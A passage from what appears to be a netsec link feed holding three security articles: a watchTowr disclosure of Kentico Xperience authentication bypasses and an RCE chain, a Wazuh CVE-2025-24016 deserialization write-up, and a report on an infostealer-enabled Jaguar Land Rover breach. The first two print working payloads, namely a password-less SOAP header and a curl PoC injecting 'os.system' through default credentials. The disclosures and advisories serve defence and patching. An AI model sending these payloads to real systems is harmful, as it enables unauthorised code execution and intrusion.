possible), you can create your own one using the same API.</p><p>Combining WT-2025-0006 with WT-2025-0007 that we’ve just walked through, we’re able to demonstrate a full-compromise chain, chaining an Authentication Bypass with our Post-Auth Remote Code Execution vulnerability - do we get bonus points for style? or @ in #darknet?</p><p>This is the entire chain flow:</p><ol><li>Bypass the authentication in the Staging Service API with WT-2025-0006.</li><li>(Optional) Create a new media library with the Staging Service (if you are not able to enumerate the existing ones).</li><li>Exploit Post-Auth Remote Code Execution (via path traversal in media file upload) with WT-2025-0011.</li></ol><p>The Kentico security team treated WT-2025-0006 Authentication Bypass seriously and delivered a patch (version 13.0.173) in 6 days.</p><p>Despite no CVE yet assigned, Kentico has taken the correct approach for their customers (kudos) and has assigned a  severity to it and published a <a href=\"https://devnet.kentico.com/download/hotfixes?ref=labs.watchtowr.com#securityBugs-v13\">following release note</a>:</p><p>However, this patch does not fix the WT-2025-0007 post-auth RCE. We theorize that, understandably, Authentication Bypass was prioritized given the context. While any RCE is painful, a post-auth RCE still has hurdles that inhibit mass exploitation.</p><p>The patch itself was very simple, yet quite effective. Specifically - instead of returning an empty password, the  method throws an exception when an invalid username is provided.</p><p>We believe this is a sensible fix, and reflects Kentico’s overall engagement.</p><p>As is a seemingly familiar feeling, we wish we could complete the blog here. Unfortunately, we can't.</p><h3>WT-2025-0011: WSE3 Tragedy</h3><p>Torn between the responsibility of writing this blog post and sourcing raccoon memes, and looking at other vulnerabilities, we decided to just give into temptation and have a wider look at the obsolete Microsoft Web Service Enhancement 3.0 library - quickly realizing how how messy it is:</p><p>It all started with the <code>Microsoft.Web.Services3.Security.Tokens.UsernameTokenManager.VerifyPassword</code> method, which we truncated for brevity in the previous section of this blog.</p><p>When we found WT-2025-0006 vulnerability, we were tunnel-visioned into exploiting the logical flaw based on a return of an empty password string. However, we completely missed a larger red flag - that we eventually noticed after soul-searching into this method for the second time.</p><p>It seems it was not wise to listen to raccoon after all. Can you spot anything weird in this code?</p><pre><code>protected virtual void VerifyPassword(UsernameToken token, string authenticatedPassword)\n{\n\tif (token == null)\n\t{\n\t\tthrow new ArgumentNullException(\"token\");\n\t}\n\tswitch (token.PasswordOption)\n\t{\n\t\tcase PasswordOption.SendNone:\n\t\t\tif (authenticatedPassword == null)\n\t\t\t{\n\t\t\t\tthrow new FormatException(SR.GetString(\"WSE566\"));\n\t\t\t}\n\t\t\tbreak;\n\t\tcase PasswordOption.SendHashed: // [1]\n\t\t\tthis.VerifyHashedPassword(token, authenticatedPassword);\n\t\t\treturn;\n\t\tcase PasswordOption.SendPlainText: // [2]\n\t\t\tthis.VerifyPlainTextPassword(token, authenticatedPassword);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn;\n\t}\n}\n</code></pre><p>There are 3  statements:</p><ol></ol><p>SendNone was mysterious, and to make it even more curious - you may have observed in the aforementioned code that all the verification routines end with a .</p><p>This is critical - when the password verification fails at any step (either it's a hash or plaintext), the WSE3 library throws an exception. <strong>If  function returns, the library thinks that we have provided valid credentials.</strong></p><p>Before we continue, let us state several things.</p><blockquote>We had a hard time to decide whether this vulnerability is strictly an issue with the already obsolete Microsoft Web Service Enhancements 3.0, or is this a vulnerability that happened due to the integration issues (how the library was used). After some time, we had made a call that the root-cause exists solely in the WSE3 codebase. We cannot expect developers to read the code of libraries and look for the logical flaws (ahem, \"undocumented features\"). On the other hand, this library is obsolete for a long time, and one shouldn't be using it at the first place.</blockquote><blockquote>WSE3 was obsoleted in (we think) 2012, and it got superseded by the appropriate classes of .NET. During those 13 years, there were multiple vulnerabilities found in those .NET libraries. For instance, see this <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf?ref=labs.watchtowr.com\">great whitepaper</a> by Oleksandr Mirosh &amp; Alvaro Muñoz. Some of those vulnerabilities still exist in WSE3, as some parts of its code were re-used in .NET.</blockquote><blockquote>We only had a very brief look at WSE3, but the conclusion is very simple. <strong>If you are using it, you should stop right NOW.</strong> We noticed some vulnerabilities there and several potential logical flaws in the authentication process. It may be extremely hard to develop a non-vulnerable integration with the WSE3 libraries. Let's treat the forthcoming paragraphs as an example of WSE3 logical flaw. There may be more of them.</blockquote><p>To sum up, it seems that if we would be able to reach the  verification method with the  option, we should be able to bypass the authentication. How can one do that? We need to investigate the  tag parsing. WSE3 parses the  tag with the <code>Microsoft.Web.Services3.Security.Tokens.UsernameToken.LoadXml</code> method:</p><pre><code>public override void LoadXml(XmlElement element)\n{\n    ...\n    this._passwordOption = PasswordOption.SendNone; // [1]\n    this._key = null;\n    if (element.HasChildNodes)\n    {\n        foreach (object obj2 in element.ChildNodes) // [2]\n        {\n            XmlNode xmlNode = (XmlNode)obj2;\n            if (xmlNode is XmlElement)\n            {\n                XmlElement xmlElement = xmlNode as XmlElement;\n                if (xmlElement != null)\n                {\n                    if (xmlElement.NamespaceURI == \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\")\n                    {\n                        string localName;\n                        if ((localName = xmlElement.LocalName) != null)\n                        {\n                            if (localName == \"Username\")\n                            {\n                                this._username = Utility.GetNodeText(xmlElement, true);\n                                continue;\n                            }\n                            if (!(localName == \"Password\")) // [3]\n                            {\n                                if (localName == \"Nonce\")\n                                {\n                                    if (this._nonce != null)\n                                    {\n                                        throw new SecurityFault(\"An invalid security token was provided\", SecurityFault.InvalidSecurityTokenCode);\n                                    }\n                                    try\n                                    {\n                                        this._nonce = new Nonce(xmlElement);\n                                        continue;\n                                    }\n                                    catch (Exception ex)\n                                    {\n                                        throw new SecurityFormatException(SecurityFormatException.InvalidNonce, ex);\n                                    }\n                                }\n                            }\n                            else\n                            {\n                                string text = xmlElement.GetAttribute(\"Type\"); // [4]\n                                if (text.Length == 0)\n                                {\n                                    text = \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText&gt;\";\n                                }\n                                if (text == \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText&gt;\")\n                                {\n                                    this._password = Utility.GetNodeText(xmlElement, true);\n                                    this._passwordOption = PasswordOption.SendPlainText;\n                                    continue;\n                                }\n                                if (text == \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\")\n                                {\n                                    this._passwordDigest = Convert.FromBase64String(Utility.GetNodeText(xmlElement, true));\n                                    this._passwordOption = PasswordOption.SendHashed;\n                                    continue;\n                                }\n                                throw new SecurityFormatException(SR.GetString(\"WSE530\", new object[]\n                                {\n                                    text\n                                })); // [5]\n                            }\n                        }\n                        this._anyElements.Add(xmlElement);\n                    }\n                    ...\n                    ...\n\n</code></pre><p>At , the code sets the  property to .</p><p>At , it iterates over XML tags.</p><p>At , it parses the  tag.</p><p>At , it retrieves the  attribute. Later, you could see that it compares it against two options: a valid  namespace and  namespace. On this basis, it sets the proper .</p><p>If the  attribute is different than the two hard-coded values, the code throws an exception at . If  is empty, it will default to the .</p><p>Looks good. What if we don't deliver the  tag though? The  will never be modified, and it will still be set to . There should still be some code that validates the XML structure, and it should refuse to accept the password-less tokens, right?</p><p>Well, kind of? Such a validation method does exist.. it just.. doesn't check for our scenario.</p><pre><code>private void CheckValid()\n{\n\tif (this._username == null || this._username.Length == 0)\n\t{\n\t\tthrow new SecurityFault(\"An invalid security token was provided\", SecurityFault.InvalidSecurityTokenCode);\n\t}\n\tif (this._passwordOption == PasswordOption.SendHashed)\n\t{\n\t\tif (this._nonce == null || this.Created == DateTime.MinValue)\n\t\t{\n\t\t\tthrow new FormatException(SR.GetString(\"WSE2439\"));\n\t\t}\n\t}\n\telse if (this._passwordOption == PasswordOption.SendPlainText &amp;&amp; this._password == null)\n\t{\n\t\tthrow new FormatException(\"The incoming Username token must contain password if the password option is set to be SendPlainText.\");\n\t}\n\tif (this.Created != DateTime.MinValue &amp;&amp; DateTime.Now &lt; this.Created.Subtract(WebServicesConfiguration.SecurityConfiguration.TimeToleranceInSeconds))\n\t{\n\t\tthrow new SecurityFault(\"An invalid security token was provided\", SecurityFault.InvalidSecurityTokenCode);\n\t}\n}\n</code></pre><p>It sometimes verifies if the  is not null. It never does that when the password verification option is set to !</p><p>Now, this is some '90s-style authentication bypass! You need to provide a username… and that’s it. This is the structure of the malicious SOAP Header:</p><pre><code>&lt;soap:Header&gt;\n  &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n    &lt;wsse:UsernameToken&gt;\n      &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n    &lt;/wsse:UsernameToken&gt;\n  &lt;/wsse:Security&gt;\n&lt;/soap:Header&gt;\n</code></pre><p>Exploitation is different between these versions though:</p><ul><li>For 13.0.172 and below, one can provide any  (like ) and the vulnerability will be successfully exploited.</li><li>Between versions 13.0.173 and 13.0.177, you need to know a valid  for the Staging SOAP service.</li></ul><p>This is because the Kentico team added this exception that will be thrown if you don't provide a proper username:</p><p>Although it makes this vulnerability harder to exploit, we strongly suspect(..) you could pop multiple instances with a default username , or some basic dictionary-based bruteforcing. We have absolutely no idea if there is a way to leak a proper username.</p><h3>Why Are There No CVEs?!?!!1</h3><p>We don't know, ask MITRE.</p><h3>Detection Artifact Generators</h3><p>We have created two separate detection artifact generators to make it easier for security teams to verify whether your instance is vulnerable, while not providing full PoCs:</p><p>You need to provide a valid target host within  argument, like: <a href=\"http://hostname/?ref=labs.watchtowr.com\">http://hostname</a> or <code>-H &lt;http://hostname/Kentico13_Admin</code>&gt; . Script will make a single HTTP Request and will analyze the response.</p><pre><code>python3 .\\\\watchTowr-vs-kentico-xperience13-AuthBypass-wt-2025-0006.py -H &lt;http://hostname&gt;\n                         __         ___  ___________\n         __  _  ______ _/  |__ ____ |  |_\\\\__    ____\\\\____  _  ________\n         \\\\ \\\\/ \\\\/ \\\\__  \\\\    ___/ ___\\\\|  |  \\\\|    | /  _ \\\\ \\\\/ \\\\/ \\\\_  __ \\\\\n          \\\\     / / __ \\\\|  | \\\\  \\\\___|   Y  |    |(  &lt;_&gt; \\\\     / |  | \\\\/\n           \\\\/\\\\_/ (____  |__|  \\\\___  |___|__|__  | \\\\__  / \\\\/\\\\_/  |__|\n                                  \\\\/          \\\\/     \\\\/\n\n        watchTowr-vs-kentico-xperience13-AuthBypass-wt-2025-0006.py\n        (*) WT-2025-0011: Kentico Xperience 13 CMS - Staging Service Authentication Bypass Check\n\n          - Piotr Bazydlo (@chudyPB) of watchTowr\n\n        CVEs: TBD\n\n[+] Verifying Authentication Bypass in Staging API\n[+] VULNERABLE: Authentication Bypassed!\n</code></pre><p>In addition to the  argument, you can provide an optional  (username) argument.</p><p>Prior to version 13.0.173, this vulnerability can be exploited with any username provided.</p><p>From version 13.0.173 to 13.0.177, you need to provide a valid Staging Service username for the successful exploitation (default username is ).</p><p>To sum up, we've been able to identify two unique Authentication Bypasses in the Kentico Xperience CMS Staging API and chain them with a Post-Auth RCE.</p><ul><li>WT-2025-0006 Authentication Bypass, exploitable on Kentico Xperience 13 &lt; 13.0.173.</li><li>WT-2025-0007 Post-Authentication Remote Code Execution, exploitable on Kentico Xperience 13 &lt; 13.0.178.</li><li>WT-2025-0011 Authentication Bypass, exploitable on Kentico Xperience 13 &lt; 13.0.178.</li></ul><p>As is hopefully now incredibly clear, an attacker who gains access to the Staging API gains full control over the CMS. Combined with the post-auth RCE vulnerability that we’ve highlighted, it should be unequivocally obvious that these vulnerabilities can be trivially chained for RCE.</p><p>We want to say thank you to the entire Kentico team involved in the disclosure process, for both their rapid and professional engagement - vulnerabilities happen, it’s life, but positive vendor engagement enables the correct outcomes for all, including customers.</p><p>We could say a lot about this research, but if we had to summarize it somehow, we’d say:</p><p>“Please, do not use the obsolete Microsoft Web Services Enhancement 3.0 for anything - you’ll get rekt\".</p><p><strong>WT-2025-0006 (Authentication Bypass)</strong></p><table><tbody><tr><td>Vulnerability discovered and disclosed to Kentico</td></tr><tr><td>watchTowr hunts through client attack surfaces for impacted systems, and communicates with those affected</td></tr><tr><td>Kentico successfully reproduced the vulnerability</td></tr><tr><td>CVE reservation request submitted to MITRE</td></tr><tr><td>Vendor releases hotfix 13.0.173 with the patch</td></tr><tr><td>MITRE notified that the vulnerability has been fixed</td></tr><tr><td>Sent MITRE query about CVE status</td></tr></tbody></table><p><strong>WT-2025-0011 (2nd Authentication Bypass)</strong></p><table><tbody><tr><td>Vulnerability discovered and disclosed to Kentico</td></tr><tr><td>watchTowr hunts through client attack surfaces for impacted systems, and communicates with those affected</td></tr><tr><td>Kentico successfully reproduced the vulnerability</td></tr><tr><td>CVE reservation request submitted to MITRE</td></tr><tr><td>Vendor releases hotfix 13.0.178 with the patch</td></tr><tr><td>Sent MITRE query about CVE status</td></tr></tbody></table><p><strong>WT-2025-0007 (Post-Auth RCE in Staging API)</strong></p><table><tbody><tr><td>Vulnerability discovered and disclosed to Kentico</td></tr><tr><td>Kentico successfully reproduced the vulnerability</td></tr><tr><td>CVE reservation request submitted to MITRE</td></tr><tr><td>Vendor releases hotfix 13.0.178 with the patch</td></tr><tr><td>Sent MITRE query about CVE status</td></tr></tbody></table><p>At&nbsp;<a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\">watchTowr</a>, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches.</p><p>With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision.</p><p>If you'd like to learn more about the&nbsp;<a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\"></a><strong>, our Attack Surface Management and Continuous Automated Red Teaming solution,</strong>&nbsp;please get in touch.</p><div><div><section><div><section><h3>Gain early access to our research, and understand your exposure, with the watchTowr Platform</h3><a href=\"https://watchtowr.com/demo/\">REQUEST A DEMO</a></section></div></section></div></div>","contentLength":54095,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jdbeaw/bypassing_authentication_like_its_the_90s_preauth/"},{"title":"CVE-2025-24016: Unsafe Deserialization Vulnerability in Wazuh Leading to Remote Code Execution","url":"https://cvereports.com/cve-2025-24016-unsafe-deserialization-vulnerability-in-wazuh-leading-to-remote-code-execution/","date":1742208210,"author":"/u/amitschenedel","guid":907,"unread":true,"content":"<p>CVE-2025-24016 is a critical remote code execution (RCE) vulnerability affecting Wazuh, a widely used open-source security information and event management (SIEM) platform. This vulnerability stems from unsafe deserialization of DistributedAPI (DAPI) parameters, allowing an attacker with API access to execute arbitrary Python code on the Wazuh server. Specifically, versions 4.4.0 to 4.9.0 are affected. The vulnerability is triggered when an attacker injects a malicious dictionary into a DAPI request or response, which is then processed by the  function. Successful exploitation can lead to complete system compromise, including data theft, service disruption, and further lateral movement within the network. The vulnerability has been patched in version 4.9.1 by replacing the unsafe  function with .</p><ul><li> 4.4.0 to 4.9.0</li><li> Unsafe Deserialization</li><li> 9.9 (Critical)</li><li> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H</li><li><code>framework/wazuh/core/cluster/common.py</code> -  function</li><li> Low (API Access)</li></ul><p>The vulnerability resides in the  function within the <code>framework/wazuh/core/cluster/common.py</code> file. This function is responsible for deserializing JSON data received through the Distributed API. The DAPI is used for communication between Wazuh components, including the Wazuh API, manager, and agents.</p><p>The vulnerable code snippet is as follows (prior to the patch):</p><pre><code>def as_wazuh_object(dct: Dict):\n    try:\n        if '__wazuh_datetime__' in dct:\n            return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])\n        elif '__unhandled_exc__' in dct:\n            exc_data = dct['__unhandled_exc__']\n            return eval(exc_data['__class__'])(*exc_data['__args__'])\n        return dct\n\n    except (KeyError, AttributeError):\n        return dct\n</code></pre><p>This code checks if the dictionary  contains the key . If it does, it retrieves the  and  values from the dictionary and uses the  function to create an instance of the specified class with the provided arguments. The use of  on attacker-controlled data is inherently dangerous, as it allows arbitrary Python code execution.</p><p>The root cause of CVE-2025-24016 is the use of the  function to deserialize data received from the Distributed API. The  function executes arbitrary Python code, making it a prime target for exploitation. An attacker can craft a malicious JSON payload containing a specially crafted dictionary with the  key. This dictionary specifies a Python class and arguments that, when evaluated by , execute arbitrary code.</p><p>The vulnerability is triggered because the  function does not properly sanitize or validate the input data before passing it to . This allows an attacker to inject arbitrary code into the  and  fields, leading to remote code execution.</p><p>For example, an attacker could send the following JSON payload:</p><pre><code>{\n    \"__unhandled_exc__\": {\n        \"__class__\": \"os.system\",\n        \"__args__\": [\"touch /tmp/pwned\"]\n    }\n}\n</code></pre><p>When this payload is processed by the  function, the  function will execute <code>os.system(\"touch /tmp/pwned\")</code>, creating a file named  on the Wazuh server.</p><p>The vulnerability is particularly dangerous because it can be triggered by anyone with API access. This includes compromised dashboards, Wazuh servers within the cluster, and, in certain configurations, even compromised agents. The DAPI is designed for internal communication between Wazuh components, but the lack of proper input validation makes it vulnerable to exploitation.</p><p>The vulnerability was patched in Wazuh version 4.9.1. The patch replaces the unsafe  function with . The  function safely evaluates a string containing a Python literal (e.g., a string, number, tuple, list, dict, boolean, or None). It does not execute arbitrary code, mitigating the RCE vulnerability.</p><p>Here's the relevant code change in <code>framework/wazuh/core/cluster/common.py</code>:</p><pre><code>--- a/framework/wazuh/core/cluster/common.py\n+++ b/framework/wazuh/core/cluster/common.py\n@@ -1824,7 +1825,8 @@ def as_wazuh_object(dct: Dict):\n             return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])\n         elif '__unhandled_exc__' in dct:\n             exc_data = dct['__unhandled_exc__']\n-            return eval(exc_data['__class__'])(*exc_data['__args__'])\n+            exc_dict = {exc_data['__class__']: exc_data['__args__']}\n+            return ast.literal_eval(json.dumps(exc_dict))\n         return dct\n \n     except (KeyError, AttributeError):\n</code></pre><p><strong>Line-by-line explanation:</strong></p><ul><li><code>-           return eval(exc_data['__class__'])(*exc_data['__args__'])</code>: This line contains the vulnerable code. It uses  to execute arbitrary code based on the  and  values in the  dictionary.</li><li><code>+           exc_dict = {exc_data['__class__']: exc_data['__args__']}</code>: This line creates a dictionary with the class name as the key and the arguments as the value.</li><li><code>+           return ast.literal_eval(json.dumps(exc_dict))</code>: This line converts the dictionary to a JSON string and then uses  to safely evaluate it. This prevents arbitrary code execution.</li></ul><p>The patch effectively mitigates the vulnerability by replacing the unsafe  function with the safe  function. The  function only evaluates Python literals, preventing attackers from injecting arbitrary code.</p><p>Additionally, the following changes were made in <code>api/test/integration/tavern_utils.py</code>:</p><pre><code>--- a/api/test/integration/tavern_utils.py\n+++ b/api/test/integration/tavern_utils.py\n@@ -2,7 +2,7 @@\n # Created by Wazuh, Inc. &lt;info@wazuh.com&gt;.\n # This program is a free software; you can redistribute it and/or modify it under the terms of GPLv2\n \n--\n+import ast\n import json\n import re\n import subprocess\n@@ -238,7 +238,7 @@ def test_validate_data_dict_field(response, fields_dict):\n \n         for element in field_list:\n             try:\n-                assert (isinstance(element[key], eval(value)) for key, value in dikt.items())\n+                assert (isinstance(element[key], ast.literal_eval(value)) for key, value in dikt.items())\n             except KeyError:\n                 assert len(element) == 1\n                 assert isinstance(element['count'], int)\n@@ -486,7 +486,7 @@ def check_agent_active_status(agents_list):\n             raise subprocess.SubprocessError(\"Error while trying to get agents\") from exc\n \n         # Transform string representation of list to list and save agents id\n-        id_active_agents = [agent['id'] for agent in eval(output)]\n+        id_active_agents = [agent['id'] for agent in ast.literal_eval(output)]\n \n         if all(a in id_active_agents for a in agents_list):\n             break\n</code></pre><p>These changes replace  with  in the test suite, ensuring that the tests are also using the safe evaluation method.</p><p>Finally, the following changes were made in <code>framework/wazuh/core/cluster/tests/test_common.py</code>:</p><pre><code>--- a/framework/wazuh/core/cluster/tests/test_common.py\n+++ b/framework/wazuh/core/cluster/tests/test_common.py\n@@ -1749,7 +1749,11 @@ def test_as_wazuh_object_ok():\n     # Test the fifth condition\n     result = cluster_common.as_wazuh_object({'__unhandled_exc__': {'__class__': 'ValueError',\n                                                                    '__args__': ('test',)}})\n-    assert isinstance(result, ValueError)\n+    assert result == {\"ValueError\": [\"test\"]}\n+\n+    result = cluster_common.as_wazuh_object({'__unhandled_exc__': {'__class__': 'exit',\n+                                                                   '__args__': []}})\n+    assert result == {\"exit\": []}\n \n     # No condition fulfilled\n     assert isinstance(cluster_common.as_wazuh_object({\"__wazuh_datetime_bad__\": \"2021-10-14\"}), dict)\n</code></pre><p>These changes update the tests to reflect the new behavior of  after the patch.  Instead of returning a  or exiting, the function now returns a dictionary representing the exception.</p><p>An attacker can exploit CVE-2025-24016 by sending a malicious JSON payload to the Wazuh server through the API. The payload must contain the  key, along with the  and  values that specify the code to be executed.</p><p>The following PoC demonstrates how to exploit the vulnerability using the  endpoint:</p><pre><code>curl -X POST -k -u \"wazuh-wui:MyS3cr37P450r.*-\" -H \"Content-Type: application/json\" --data '{\"__unhandled_exc__\":{\"__class__\": \"os.system\", \"__args__\": [\"touch /tmp/pwned\"]}}' https://&lt;worker-server&gt;:55000/security/user/authenticate/run_as\n</code></pre><ul><li>: Specifies the HTTP method as POST.</li><li>: Disables SSL certificate verification (for testing purposes).</li><li><code>-u \"wazuh-wui:MyS3cr37P450r.*-\"</code>: Provides the username and password for authentication. The default credentials are used here.</li><li><code>-H \"Content-Type: application/json\"</code>: Sets the Content-Type header to application/json.</li><li><code>--data '{\"__unhandled_exc__\":{\"__class__\": \"os.system\", \"__args__\": [\"touch /tmp/pwned\"]}}'</code>: Specifies the malicious JSON payload. This payload will execute the command  on the Wazuh server.</li><li><code>https://&lt;worker-server&gt;:55000/security/user/authenticate/run_as</code>: Specifies the URL of the  endpoint. Replace  with the actual hostname or IP address of the Wazuh worker server.</li></ul><ol><li> The attacker identifies a vulnerable Wazuh server (version 4.4.0 to 4.9.0).</li><li> The attacker obtains valid API credentials, either through default credentials, credential stuffing, or other means.</li><li> The attacker sends a malicious JSON payload to the  endpoint, as shown in the PoC above.</li><li> The  function deserializes the payload and executes the attacker-controlled code.</li><li> The attacker gains control of the Wazuh server and can perform various malicious activities, such as data theft, service disruption, or lateral movement within the network.</li></ol><p>The exploitation of CVE-2025-24016 can have severe consequences for organizations using Wazuh. An attacker could:</p><ul><li><strong>Gain complete control of the Wazuh server:</strong> This allows the attacker to access sensitive data, modify configurations, and install malware.</li><li><strong>Compromise the entire Wazuh cluster:</strong> If the attacker gains control of the master server, they can potentially compromise all other servers and agents in the cluster.</li><li><strong>Disrupt security monitoring:</strong> The attacker can disable or tamper with Wazuh's monitoring capabilities, allowing them to carry out further attacks undetected.</li><li> The attacker can access logs, alerts, and other sensitive data stored on the Wazuh server.</li><li><strong>Use the Wazuh server as a launching pad for further attacks:</strong> The attacker can use the compromised server to attack other systems within the network.</li></ul><p>To mitigate the risk of CVE-2025-24016, organizations should take the following steps:</p><ol><li><strong>Upgrade to Wazuh version 4.9.1 or later:</strong> This version contains the patch that fixes the vulnerability.</li><li> Limit API access to only authorized users and systems.</li><li><strong>Implement strong authentication:</strong> Use strong passwords and multi-factor authentication to protect API credentials.</li><li> Monitor API traffic for suspicious activity, such as unexpected requests or large data transfers.</li><li><strong>Regularly review and update security configurations:</strong> Ensure that Wazuh's security configurations are up-to-date and properly configured.</li><li><strong>Implement network segmentation:</strong> Segment the network to limit the impact of a successful attack.</li><li><strong>Use a Web Application Firewall (WAF):</strong> A WAF can help to detect and block malicious requests before they reach the Wazuh server.</li></ol><ul><li>Review and restrict access to the Wazuh API. Ensure that only authorized users and systems have access.</li><li>Implement strong authentication mechanisms for the API, such as multi-factor authentication.</li><li>Monitor API logs for suspicious activity.</li></ul><ul><li>Follow the principle of least privilege when granting API access.</li><li>Regularly review and update security configurations.</li><li>Implement a robust security monitoring program.</li><li>Stay informed about the latest security threats and vulnerabilities.</li></ul><p>If upgrading to Wazuh version 4.9.1 is not immediately possible, consider the following temporary workarounds:</p><ul><li><strong>Implement a WAF rule to block malicious payloads:</strong> A WAF rule can be created to detect and block requests containing the  key. However, this workaround is not foolproof, as attackers may be able to bypass the rule with obfuscation techniques.</li><li><strong>Disable the  endpoint:</strong> If the  endpoint is not required, it can be disabled to prevent exploitation of the vulnerability through this specific endpoint. However, this does not address the underlying vulnerability in the  function.</li></ul><h2>Timeline of Discovery and Disclosure</h2><ul><li><strong>Vulnerability Discovered:</strong> Unknown</li><li> Unknown</li><li> July 23, 2024 (Wazuh 4.9.1)</li><li> February 10, 2025</li></ul><p>CVE-2025-24016 is similar to other unsafe deserialization vulnerabilities that have been discovered in various software applications. These vulnerabilities typically arise when an application deserializes data from an untrusted source without proper validation, allowing an attacker to inject malicious code into the deserialized object.</p><p>A well-known example is the Apache Struts vulnerability (CVE-2017-5638), which allowed remote code execution through the Content-Type header. Similar to CVE-2025-24016, the Apache Struts vulnerability was caused by the application's failure to properly sanitize user-supplied input before deserialization.</p><p>The evolution of security practices has led to increased awareness of the risks associated with deserialization. Modern frameworks and libraries often provide built-in mechanisms for safe deserialization, such as whitelisting allowed classes or using secure serialization formats. However, as CVE-2025-24016 demonstrates, vulnerabilities can still arise when developers fail to use these mechanisms properly or when custom deserialization logic is implemented without adequate security considerations.</p><p>The key takeaway from these vulnerabilities is the importance of input validation and secure coding practices. Applications should never trust data from untrusted sources and should always sanitize and validate input before processing it. Developers should also be aware of the risks associated with deserialization and should use secure deserialization techniques whenever possible.</p>","contentLength":13737,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jd9oed/cve202524016_unsafe_deserialization_vulnerability/"},{"title":"Jaguar Land Rover Breached by HELLCAT Ransomware Group Using Its Infostealer Playbook—Then a Second Hacker Strikes","url":"https://www.infostealers.com/article/jaguar-land-rover-breached-by-hellcat-ransomware-using-its-infostealer-playbook-then-a-second-hacker-strikes/","date":1742199866,"author":"/u/Malwarebeasts","guid":888,"unread":true,"content":"<p>In a repeat of a now-familiar playbook, the HELLCAT ransomware group has claimed responsibility for a massive data breach targeting , leaking gigabytes of sensitive information including proprietary documents, source codes, and employee and partner data. </p><p>The breach, executed by a threat actor known as “Rey,” mirrors a pattern of attacks Hudson Rock researchers have previously detected against high-profile victims like <a href=\"https://www.infostealers.com/article/telefonica-breach-infostealer-malware-opens-door-for-social-engineering-tactics/\">Telefónica</a>, <a href=\"https://www.infostealers.com/article/schneider-electric-hacked-and-blackmailed-due-to-lumma-infostealer-infection/\">Schneider Electric</a>, and <a href=\"https://www.infostealers.com/article/ais-role-in-turning-massive-data-leaks-into-hacker-paydays-a-look-at-the-orange-breach/\">Orange</a>.</p><p>At the heart of this latest incident lies a technique that has become HELLCAT’s signature: <strong>exploiting Jira credentials harvested from compromised employees that were infected by Infostealers.</strong></p><p>What makes this breach particularly alarming is its reliance on a technique that has proven devastatingly effective: <strong>the use of infostealer malware to harvest credentials, which are then weaponized to infiltrate critical systems like Atlassian JIRA. </strong></p><p>In this case, the compromised credentials belonged to an LG Electronics employee infected by an infostealer who had third party credentials to JLR’s Jira server.</p><p>Just days after Rey’s initial announcement, the Jaguar Land Rover breach took an even darker turn. A second threat actor, operating under the alias “APTS,” emerged with his own thread on the forum, <strong>claiming to have exploited infostealer credentials that date all the way back to 2021, also belonging to an LG Electronic employee, to access JLR’s systems and exfiltrate an even larger amount of data from the company</strong>.</p><p>APTS shared a screenshot of a Jira dashboard and displayed additional sensitive data, they also <strong>confirmed that the credentials that were used matched the ones we have in Hudson Rock’s database</strong>:</p><p>“APTS” leaked a further tranche of data—<strong>estimated at an even more worrying scale of 350 gigabytes</strong>—containing data that did not exist in Rey’s data dump.</p><p>HELLCAT’s modus operandi is very efficient. Infostealer malware—such as Lumma, which was implicated in the Schneider Electric breach—silently infects employees’ devices, often through phishing emails, malicious downloads, or compromised websites. Once embedded, the malware exfiltrates sensitive data, including login credentials for corporate systems. These stolen credentials are then sold or hoarded on the dark web, waiting for threat actors like Rey and “APTS” to exploit them.</p><p>In the Jaguar Land Rover breach, following the thread posted by “APTS” and a short confrontation between the threat actors, Rey himself confirmed publicly that the entry point was an Atlassian Jira instance while referencing Hudson Rock’s research on his Telefonica hack –</p><p>What sets the JLR breach apart is the age of the compromised credentials. Hudson Rock, which has tracked infostealer infections since at least 2018, had previously identified the employee’s stolen login details as part of its vast database of exposed credentials. Despite their age, the credentials remained valid and unchanged within JLR’s systems—a lapse that hackers exploited years later. <strong>This delay between infection and exploitation is a reminder of the long tail of infostealer campaigns, where stolen data can linger as a latent threat until the right buyer comes along.</strong></p><p>The Jaguar Land Rover breach is the latest in a string of high-profile attacks that expose the devastating potential of infostealer malware. Telefónica’s breach demonstrated how such infections could enable social engineering, while Schneider Electric’s ordeal revealed the blackmail potential of stolen data. Orange’s case illustrated how AI could amplify these leaks into hacker paydays. Now, JLR’s breach adds a new layer: the enduring danger of legacy credentials left unaddressed.</p><p>For organizations, the lesson is clear—infostealer infections are not one-off incidents but ticking time bombs. The credentials they harvest can remain viable for years, especially if companies fail to implement robust monitoring, multi-factor authentication (MFA), or timely credential rotation.</p><p>Atlassian Jira, while a powerful tool, has become a prime target for attackers due to its centrality in enterprise workflows and the wealth of data it houses. Once inside, threat actors like HELLCAT can move laterally, escalate privileges, and extract sensitive information with alarming ease.</p><p>As Jaguar Land Rover scrambles to assess the damage and secure its systems, the cybersecurity community braces for the fallout. The leaked data—source code, employee details, and partner information—could fuel further attacks, from targeted phishing campaigns to intellectual property theft. This is especially true as threat actors begin utilizing AI to take advantage of 